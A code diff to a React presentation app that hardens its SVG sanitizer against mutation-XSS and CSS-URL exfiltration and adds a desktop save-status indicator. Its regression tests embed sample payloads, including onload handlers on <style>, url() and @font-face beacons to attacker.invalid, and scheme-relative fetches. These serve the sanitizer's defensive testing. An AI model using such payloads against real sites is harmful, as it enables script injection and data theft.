@@ -138,7 +138,9 @@ const velaClipboardReadSlides = async () => {
 const VELA_VERSION = "13.19";
 const VELA_CHANGELOG = [
   { v: "13.19", d: "Reorder items inside a block — hover any point/card/step in edit mode and use the ▲▼ arrows (next to delete) to move it up or down. Works across bullets, checklists, grids, timelines, comparisons and more." },
+  { v: "13.19", d: ["Security (defense-in-depth): closed a mutation-XSS gap in the deck SVG sanitizer where an event handler could survive on a <style> element, and added layered backstops — a namespace-validity invariant and an output-side re-parse check that rejects any markup a handler/script would survive on the HTML render.", "Desktop shell: the filesystem guard is now frozen and refuses whole-volume, shallow, and OS-critical system roots, further capping file read/write blast radius.", "Regression tests added for all of the above."] },
   { v: "13.18", d: "Present view now has an Edit toggle (✎ button, or Shift+E) that turns on inline click-to-edit while presenting — off by default so the audience sees a clean slide; resets each time you leave Present." },
+  { v: "13.18", d: ["Security (High): hardened the SVG <style>/presentation-attribute CSS filter against a CSS-URL exfil-beacon bypass — external and scheme-relative references are now rejected on token presence rather than on a well-formed match, and at-rules (@import/@font-face) are refused. Closes a zero-click render-time fetch on the host runtimes where the deck sanitizers are the sole backstop.", "Added malformed-input regression tests exercised against the real browser sink."] },
   { v: "13.17", d: "Ctrl/⌘-click a section's collapse arrow in the list to collapse or expand every section at once — plain click still toggles just that one section." },
   { v: "13.16", d: "Fixed a race where opening/reloading a deck appended a spurious empty \u201CNew section\u201D each time — the empty-deck seed no longer fires against a deck that is still loading." },
   { v: "13.15", d: "Move a slide/selection to another section with Ctrl/⌘-click on the destination to move it \u201Cout\u201D while keeping focus in the current section on the next slide (or the first slide of the following section when you move the last one) — plain click still follows the slide into its new section." },
@@ -574,9 +576,24 @@ function isSvgStyleSafe(css) {
   // paint CSS never needs comments; reject outright, mirroring the backslash reject
   // above. (Pairs with the same reject in STYLE_VALUE_REJECT.)
   if (css.indexOf("/*") !== -1) return false;
-  if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
-  const urls = css.match(/url\s*\([^)]*\)/gi);
-  if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  if (/expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
+  // Reject any at-rule outright: @import pulls an external sheet and @font-face
+  // (with unicode-range) is a per-character font-exfil beacon. Legit Vela paint
+  // CSS never needs one. (Supersedes the prior @import-only reject.)
+  if (css.indexOf("@") !== -1) return false;
+  // Reject any absolute or scheme-relative URL authority. Mirrors STYLE_VALUE_REJECT's
+  // `://` guard (which this filter previously lacked) and also catches scheme-relative
+  // `//host`. Legit paint CSS (colors, url(#frag), sizes) never contains `//`.
+  if (css.indexOf("//") !== -1) return false;
+  // Every url() must be a same-document #fragment paint reference (url(#grad)).
+  // Match the OPENING url( token and require its first meaningful char (past an
+  // optional quote and whitespace) to be '#'. Crucially this does NOT depend on a
+  // closing ')': per CSS Syntax L3 §4.3.6 the tokenizer consumes an unterminated
+  // `url(https://host` to end-of-input and still emits a valid, fetchable
+  // <url-token>, so the prior paren-balanced /url\(...\)/ match missed BOTH the
+  // bare and the quoted unterminated forms. An empty url()/url( ) fetches nothing
+  // and stays allowed.
+  if (/url\s*\(['"\s]*[^#'"\s]/i.test(css)) return false;
   // v12.59: reject any non-url() CSS function fed a string literal. image-set()/
   // image()/cross-fade()/src() (and any future image-ish function) take a bare
   // "https://…" string with NO url() token, so the url() check above misses them
@@ -595,6 +612,25 @@ function isSvgStyleSafe(css) {
 function sanitizeSvgMarkup(raw) {
   if (typeof raw !== "string") return "";
   try {
+    // Output-side mutation-XSS backstop (nested so the whole sanitizer stays
+    // self-contained). The sanitized string is about to be handed to
+    // dangerouslySetInnerHTML, which re-parses it in HTML mode. Re-parse it here
+    // the SAME way and reject the whole payload if the HTML interpretation
+    // exposes a <script> or any event-handler attribute — i.e. the SVG→HTML
+    // crossing turned inert markup live. This INDEPENDENT net fails closed even
+    // if a node-level filter below is bypassed by a future edit or an unknown
+    // parser quirk, so no single missed element reaches the sink live. (v13.19)
+    const outputIsClean = (str) => {
+      if (!str) return true;
+      const d = new DOMParser().parseFromString(`<div>${str}</div>`, "text/html");
+      for (const el of d.querySelectorAll("*")) {
+        if ((el.localName || "").toLowerCase() === "script") return false;
+        for (const a of el.attributes) {
+          if (a.name.toLowerCase().startsWith("on")) return false;
+        }
+      }
+      return true;
+    };
     const doc = new DOMParser().parseFromString(`<svg xmlns="http://www.w3.org/2000/svg">${raw}</svg>`, "image/svg+xml");
     const err = doc.querySelector("parsererror");
     if (err) return "";
@@ -611,13 +647,27 @@ function sanitizeSvgMarkup(raw) {
           // SECURITY (v12.54): allowlist — anything not explicitly known-safe is removed.
           // Replaces the previous SVG_BLOCKED_TAGS blocklist (inherently incomplete).
           if (!SVG_ALLOWED_TAGS.has(tag)) { child.remove(); continue; }
+          // SECURITY (v13.19): namespace-validity invariant — defense in depth
+          // against mutation-XSS by namespace confusion. We parse as
+          // image/svg+xml, so every legitimately-allowed element lives in the SVG
+          // namespace. An element bearing an allowlisted *name* but a non-SVG
+          // namespaceURI (an HTML/MathML node smuggled through an integration
+          // point, or a parser quirk) is exactly the construct that re-parses
+          // differently at the HTML dangerouslySetInnerHTML sink. Drop anything
+          // outside the SVG namespace. Mirrors DOMPurify's _checkValidNamespace.
+          if (child.namespaceURI !== "http://www.w3.org/2000/svg") { child.remove(); continue; }
           if (tag === "style") {
             if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
-            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>).
-            // SECURITY (v12.52): we MUST still descend so the nodeType filter above
-            // strips any CDATA/comment/PI children. CDATA serializes literally and
-            // a smuggled `</style>` inside it escapes rawtext when re-parsed as HTML
-            // by dangerouslySetInnerHTML, yielding a live <img onerror=...>.
+            // SECURITY: strip EVERY attribute from <style> — do NOT skip the
+            // attribute pass. <style> is a common SVG/HTML element, so on the
+            // dangerouslySetInnerHTML HTML re-parse any surviving handler goes
+            // live (mutation-XSS). Legitimate SVG <style> needs no attribute we
+            // keep (type/media are inert and optional), so drop them all
+            // uniformly rather than trusting an element-specific shortcut. (v13.19)
+            for (const a of Array.from(child.attributes)) child.removeAttribute(a.name);
+            // Still descend so the nodeType filter above strips any CDATA/comment/PI
+            // children. CDATA serializes literally and a smuggled `</style>` inside
+            // it escapes rawtext when re-parsed as HTML, yielding a live handler.
             walk(child);
             continue;
           }
@@ -680,10 +730,12 @@ function sanitizeSvgMarkup(raw) {
     // scope, neutralizing HTML-aliasing for the whole tag class. (v12.62)
     if (!root.innerHTML.trim()) return "";
     const top = Array.from(root.children);
-    if (top.length === 1 && (top[0].localName || "").toLowerCase() === "svg") {
-      return top[0].outerHTML;
-    }
-    return root.outerHTML;
+    const out = (top.length === 1 && (top[0].localName || "").toLowerCase() === "svg")
+      ? top[0].outerHTML
+      : root.outerHTML;
+    // Defense in depth: reject the whole payload if an HTML re-parse would expose
+    // script/handlers the SVG parse hid (mutation-XSS backstop). (v13.19)
+    return outputIsClean(out) ? out : "";
   } catch (_) { return ""; }
 }
 
@@ -10261,6 +10313,26 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<rect width="10" height="10" onload="alert(1)" />');
     return !/\bon\w+\s*=/i.test(out);
   }},
+  { name: "Event handler on <style> stripped (bare)", fn: async () => {
+    // <style> is a common SVG/HTML element: a surviving on* handler goes live on
+    // the HTML re-parse. Must be stripped like any other element's handler.
+    const out = sanitizeSvgMarkup('<style onload="alert(1)">.a{fill:#000}</style><rect/>');
+    return !/\bon\w+\s*=/i.test(out);
+  }},
+  { name: "Event handler on <style> nested in <desc>/<title> stripped (mXSS)", fn: async () => {
+    // desc/title are HTML integration points — the classic namespace-confusion
+    // mutation-XSS setup. Neither the nested handler nor a top-level one survives.
+    const a = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><rect/>');
+    const b = sanitizeSvgMarkup('<title><style onload="alert(1)">x</style></title><rect/>');
+    return !/\bon\w+\s*=/i.test(a) && !/\bon\w+\s*=/i.test(b);
+  }},
+  { name: "SVG output has no handler after HTML re-parse (mXSS backstop)", fn: async () => {
+    // Independent output-side check: whatever survives must be inert when the
+    // sink re-parses it as HTML — no element carries an on* handler.
+    const out = sanitizeSvgMarkup('<desc><style onload="alert(1)">x</style></desc><g onclick="alert(2)"><rect/></g>');
+    const html = new DOMParser().parseFromString(`<div>${out}</div>`, "text/html");
+    return ![...html.querySelectorAll("*")].some((el) => [...el.attributes].some((at) => /^on/i.test(at.name)));
+  }},
   { name: "script element stripped", fn: async () => {
     const out = sanitizeSvgMarkup('<g><script>alert(1)</script></g>');
     return !/<script/i.test(out);
@@ -10308,6 +10380,33 @@ uiSuite("SVG Sanitizer (XSS)", [
   { name: "SVG fill='url(https://…)' presentation attr removed", fn: async () => {
     const out = sanitizeSvgMarkup('<rect fill="url(https://attacker.invalid/b)" filter="url(https://attacker.invalid/f)"/>');
     return !/attacker\.invalid/i.test(out);
+  }},
+  // v13.18 — detection must not depend on a closing ')': the CSS tokenizer consumes
+  // an UNTERMINATED url( to end-of-input and still emits a fetchable url-token, so a
+  // paren-balanced regex missed both the bare and quoted unterminated forms.
+  { name: "SVG <style> unterminated url( (bare) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url(https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> unterminated url( (quoted) removed (EOF url-token)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>rect{fill:url("https://attacker.invalid/b?d=x</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG style='…url(https://…' unterminated attr removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<rect style="background-image:url(https://attacker.invalid/b" mask="url(https://attacker.invalid/m"/>');
+    return !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG scheme-relative url(//host) removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>*{background:url(//attacker.invalid/b)}</style><rect fill="url(//attacker.invalid/p)"/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @font-face char-exfil removed", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@font-face{font-family:x;src:url(https://attacker.invalid/f)}text{font-family:x}</style><text x="1" y="9">A</text>');
+    return !/attacker\.invalid/i.test(out) && !/@font-face/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG url(#fragment) with whitespace/quotes still preserved (no false reject)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.a{fill:url( #grad )}.b{mask:url("#m")}</style><rect class="a" clip-path="url(#c)"/>');
+    return /<style/i.test(out) && /#grad/.test(out) && /url\(#c\)/.test(out);
   }},
   { name: "SVG external <image href> beacon removed (#fragment only)", fn: async () => {
     const out = sanitizeSvgMarkup('<image href="https://attacker.invalid/b.png"/>');
@@ -10985,6 +11084,57 @@ uiSuite("Move Picker Search (F6)", [
     if (bd) _click(bd); await _wait(150);
   }},
 ], { setup: _editorSetup });
+
+// Desktop save-status pill (CR3) — the "no hint or error" half of the Windows
+// silent-save bug. Drives the app's save-status channel (window.__velaOnSaveStatus,
+// wired by the app effect; nl-boot feeds it from deck-io on the real desktop) and
+// asserts the pill's state machine + the Retry affordance. Stable test-ids:
+//   save-status-pill  (data-save-state = saving|saved|failed|reconnecting)
+//   save-status-retry / save-failed-toast / save-failed-toast-retry
+const _savePill = () => _$('[data-testid="save-status-pill"]');
+const _saveState = () => { const p = _savePill(); return p ? p.getAttribute("data-save-state") : null; };
+uiSuite("Desktop save-status pill (CR3)", [
+  { name: "channel wired: window.__velaOnSaveStatus is a function", fn: async () => {
+    if (typeof window.__velaOnSaveStatus !== "function") throw new Error("save-status channel not wired");
+  }},
+  { name: "saving → saved renders the pill with 'Saved' copy", fn: async () => {
+    window.__velaOnSaveStatus({ state: "saving", at: Date.now() });
+    await _waitFor(() => _saveState() === "saving", 2000);
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    const pill = await _waitFor(() => (_saveState() === "saved" ? _savePill() : null), 2000);
+    if (!/Saved/.test(pill.textContent || "")) throw new Error("saved pill missing copy: " + pill.textContent);
+  }},
+  { name: "failed save surfaces a Retry pill + one-shot toast (not swallowed)", fn: async () => {
+    window.__velaOnSaveStatus({ state: "failed", at: Date.now(), error: "mock write reject" });
+    const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
+    if (!/Retry/i.test(pill.textContent || "")) throw new Error("failed pill missing Retry: " + pill.textContent);
+    await _waitFor(() => _$('[data-testid="save-failed-toast"]'), 2000);
+  }},
+  { name: "Retry invokes __velaForceSave and returns to Saved", fn: async () => {
+    const orig = window.__velaForceSave;
+    let called = 0;
+    window.__velaForceSave = () => { called++; window.__velaOnSaveStatus({ state: "saved", at: Date.now() }); };
+    try {
+      window.__velaOnSaveStatus({ state: "failed", at: Date.now() });
+      const pill = await _waitFor(() => (_saveState() === "failed" ? _savePill() : null), 2000);
+      _click(pill);
+      if (called < 1) throw new Error("__velaForceSave was not called by Retry");
+      await _waitFor(() => _saveState() === "saved", 2000);
+    } finally {
+      window.__velaForceSave = orig;
+    }
+  }},
+  { name: "reconnecting renders an amber pill; then cleans up", fn: async () => {
+    window.__velaOnSaveStatus({ state: "reconnecting", at: Date.now() });
+    const pill = await _waitFor(() => (_saveState() === "reconnecting" ? _savePill() : null), 2000);
+    if (!/Reconnect/i.test(pill.textContent || "")) throw new Error("reconnecting copy missing: " + pill.textContent);
+    // Cleanup so the pill/toast don't leak into later suites.
+    window.__velaOnSaveStatus({ state: "saved", at: Date.now() });
+    await _wait(60);
+    window.__velaOnSaveStatus(null);
+    await _waitFor(() => _savePill() == null, 1500).catch(() => {});
+  }},
+]);
 
 // ━━━ UI TEST RUNNER COMPONENT ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -18350,6 +18500,17 @@ export default function App() {
   const _localSyncState = useRef(null);
   _localSyncState.current = state; // always up-to-date
 
+  // ━━━ Desktop save-status (Neutralino) ━━━━━━━━━━━━━━━━━━━━━━━━━━━
+  // deck-io reports every save transition through window.__velaOnSaveStatus so
+  // a failed/stalled file write is NEVER silent (the reported Windows bug). Null
+  // outside the desktop shell (artifact / serve.py never emit) → pill hidden.
+  const [saveStatus, setSaveStatus] = useState(() => {
+    try { return (typeof window !== "undefined" && window.__velaSaveState) || null; } catch { return null; }
+  });
+  const [saveFailToast, setSaveFailToast] = useState(false);
+  const saveFailToastTimer = useRef(null);
+  const prevSaveStateRef = useRef(saveStatus && saveStatus.state);
+
   // Expose UI context for channel bridge (browser → Claude Code)
   useEffect(() => {
     if (!VELA_LOCAL_MODE) return;
@@ -18469,6 +18630,33 @@ export default function App() {
     };
     return () => { window.__velaReceiveDeckUpdate = null; };
   }, []);
+
+  // Desktop save-status: subscribe to deck-io's transitions (wired by nl-boot).
+  // Wired unconditionally so the desktop shell's emits land AND the UI battery
+  // can drive the pill by calling window.__velaOnSaveStatus(...) directly.
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    window.__velaOnSaveStatus = (s) => setSaveStatus(s || null);
+    if (window.__velaSaveState) setSaveStatus(window.__velaSaveState);
+    return () => { if (window.__velaOnSaveStatus) window.__velaOnSaveStatus = null; };
+  }, []);
+
+  // One-shot toast on the FIRST transition into a failed save, so a user not
+  // watching the header still notices. The header pill is the persistent signal;
+  // the toast auto-dismisses. Re-arms only after a subsequent successful save.
+  useEffect(() => {
+    const cur = saveStatus && saveStatus.state;
+    const prev = prevSaveStateRef.current;
+    if (cur === "failed" && prev !== "failed") {
+      setSaveFailToast(true);
+      clearTimeout(saveFailToastTimer.current);
+      saveFailToastTimer.current = setTimeout(() => setSaveFailToast(false), 8000);
+    } else if (cur === "saved") {
+      setSaveFailToast(false);
+    }
+    prevSaveStateRef.current = cur;
+  }, [saveStatus]);
+  useEffect(() => () => clearTimeout(saveFailToastTimer.current), []);
 
   // ━━━ Change tracking (since last load/export) ━━━━━━━━━━━━━━━━━━━
   const snapshotRef = useRef(new Map()); // moduleId → JSON string of slides
@@ -18878,11 +19066,36 @@ export default function App() {
         </div>
       </div>}
 
+      {/* One-shot save-failure toast (desktop). The header pill is the persistent signal; this just catches the eye once. */}
+      {saveFailToast && <div data-testid="save-failed-toast" style={{ position: "fixed", left: 16, bottom: 16, zIndex: 100000, maxWidth: 340, background: T.bgPanel, border: `1px solid ${T.red}`, borderLeft: `3px solid ${T.red}`, borderRadius: 8, boxShadow: "0 12px 40px rgba(0,0,0,0.4)", padding: "12px 14px", display: "flex", flexDirection: "column", gap: 6, fontFamily: FONT.body }}>
+        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
+          <span style={{ color: T.red, fontSize: 14, fontWeight: 700 }}>Save failed</span>
+          <div style={{ flex: 1 }} />
+          <span onClick={() => setSaveFailToast(false)} title="Dismiss" style={{ cursor: "pointer", color: T.textDim, fontSize: 14, lineHeight: 1 }}>{"✕"}</span>
+        </div>
+        <div style={{ fontSize: 12, color: T.textMuted }}>Vela couldn't write to your file. Your work is safe in the app.</div>
+        <div style={{ display: "flex", gap: 8, marginTop: 2 }}>
+          <button data-testid="save-failed-toast-retry" onClick={() => { try { if (window.__velaForceSave) window.__velaForceSave(); } catch {} setSaveFailToast(false); }} style={{ padding: "4px 12px", background: T.red, color: "#fff", border: "none", borderRadius: 5, fontFamily: FONT.mono, fontSize: 12, fontWeight: 700, cursor: "pointer" }}>Retry</button>
+        </div>
+      </div>}
+
       {/* ── TOP BAR — title left, actions right, dropdown buttons ── */}
       {!state.fullscreen && <header style={{ padding: isMobile ? "6px 10px" : "0 14px", borderBottom: `1px solid ${T.border}`, display: "flex", alignItems: "center", gap: isMobile ? 8 : 10, background: T.bgPanel, flexShrink: 0, height: isMobile ? 40 : 44 }}>
         {/* Left: icon + title + time */}
         {isMobile && mobileTab !== "list" && <button onClick={() => { setMobileTab("list"); if (mobileTab === "slides") dispatch({ type: "DESELECT" }); }} style={S.btn({ padding: "2px 4px", color: T.accent, fontSize: 16 })}>{"←"}</button>}
         <span onClick={() => { if (typeof window !== "undefined" && typeof window.__velaOpenDeckPicker === "function") { window.__velaOpenDeckPicker(); } else { setShowChangelog(true); } }} style={{ cursor: "pointer", display: "flex", alignItems: "center" }} title={typeof window !== "undefined" && typeof window.__velaOpenDeckPicker === "function" ? "Open deck (Ctrl+O)" : "About"}><VelaIcon size={20} /></span>
+        {/* Desktop save-status pill — beside the sail icon so "which file + is it saved" read together. Hidden unless the desktop shell emits a status. */}
+        {!isMobile && saveStatus && (() => {
+          const st = saveStatus.state;
+          const at = saveStatus.at;
+          const timeStr = at ? (() => { try { return new Date(at).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" }); } catch { return ""; } })() : "";
+          const base = { display: "flex", alignItems: "center", gap: 4, padding: "2px 8px", borderRadius: 4, fontFamily: FONT.mono, fontSize: 11, fontWeight: 600, whiteSpace: "nowrap", flexShrink: 0, userSelect: "none" };
+          if (st === "saved") return <span data-testid="save-status-pill" data-save-state="saved" title={timeStr ? `Saved ${timeStr}` : "Saved"} style={{ ...base, color: T.textDim, cursor: "default" }}>{"✓"} Saved</span>;
+          if (st === "saving") return <span data-testid="save-status-pill" data-save-state="saving" title="Saving to your file…" style={{ ...base, color: T.textMuted, cursor: "default" }}>{"⟳"} Saving…</span>;
+          if (st === "reconnecting") return <span data-testid="save-status-pill" data-save-state="reconnecting" title="Lost the connection to your file — reconnecting. Restart Vela if this persists." style={{ ...base, color: T.amber, background: T.amber + "18", cursor: "default" }}>{"◍"} Reconnecting…</span>;
+          // failed
+          return <span data-testid="save-status-pill" data-save-state="failed" role="button" onClick={() => { try { if (window.__velaForceSave) window.__velaForceSave(); } catch {} }} title="Vela couldn't write to your file — click to retry" style={{ ...base, color: T.red, background: T.red + "18", cursor: "pointer" }}><span style={{ fontFamily: FONT.mono, fontSize: 9, color: T.red }}>●</span> <span data-testid="save-status-retry">Couldn't save — Retry</span></span>;
+        })()}
         {editingTitle ? (
           <input autoFocus value={titleDraft} onChange={(e) => setTitleDraft(e.target.value)}
             onKeyDown={(e) => { if (e.key === "Enter") commitTitle(); if (e.key === "Escape") setEditingTitle(false); }}
